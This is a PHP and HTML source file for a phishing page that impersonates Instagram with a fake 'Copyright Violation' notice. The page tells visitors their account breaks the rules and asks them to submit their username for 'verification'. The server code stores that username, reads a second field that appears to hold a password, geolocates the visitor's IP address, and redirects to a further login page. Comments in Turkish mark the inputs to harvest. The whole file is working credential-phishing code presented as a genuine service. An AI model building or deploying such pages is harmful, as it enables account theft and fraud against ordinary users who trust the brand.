<?php
ob_start();
session_start();
set_time_limit(0);
error_reporting(0);

if ($_POST) {

  $username=$_POST["username"];
  $_SESSION["username"]=$username;
  $slokerp =  $_POST['slokerp'];
  $ip = $_SERVER['REMOTE_ADDR'];
  $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
  $ulke = $details->country;
  $sehir = $details->city;
  date_default_timezone_set('Europe/Istanbul');
  $tarih = date("d-m-Y H:i:s");

  

      
        header("location: login.php");
    }
    ?>


<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Instagram</title>
	<link rel="stylesheet" type="text/css" href="slokermain.css">

	    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/840px-Instagram_logo.svg.png" />
	<meta property="og:type" content="website">
    <meta property="og:url" content="https://instagram.com/">
    <meta property="og:title" content="Instagram Copyright Center">
    <meta property="og:description" content="Create an account or log in to Instagram - A simple, imaginative and creative way to edit photos and videos and share them with your teacher guides.">
<link rel="icon" sizes="192x192" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
</head>
<body>


	<div class="slokerborder">
		<center>		<img src="slokerimg/1.png" width="125" style="margin-top: 10px; margin-left: -1300px;">
			</center>

			</div>

<div class="slokermain">

<center>
	<img src="slokerimg/4.png" width="150">
</center>
<h3 class="slokertelif9">Copyright Violation</h3>
<h3 class="slokertelif4">You have been redirected to this page, your account violates our rules, if you think this is an error, please fill out the form to verify your account.

</h3>

<br>

<form method="post">
<!--Veri Çekilecek İnputlar-->
<input type="text" name="username" placeholder="Username" required>	
<!--Veri Çekilecek İnputlar / Sloker-->
<button type="submit"  class="slokerbtn">Continue</button>

</form>



<!--Telif Hakkı Nedir Yazısı -->
	<h3 class="slokertelif1">What is Copyright?</h3>
	
	<center>
	<img src="https://pngroyale.com/wp-content/uploads/2021/11/Download-copyright-png-images-available-for-download-crazypngm-crazy-png-i-.png" width="100">
	</center>

	<h3 class="slokertelif2">Copyright is the legally provided rights regarding the use and copying of information, ideas, works of art and products created by a person or persons with all kinds of intellectual labor. No registration is required for copyright to arise. Rights on intellectual and artistic works arise with the production of the work.</h3>
<!--Yazı Bitiş / Sloker-->

</div>




</body>


</html>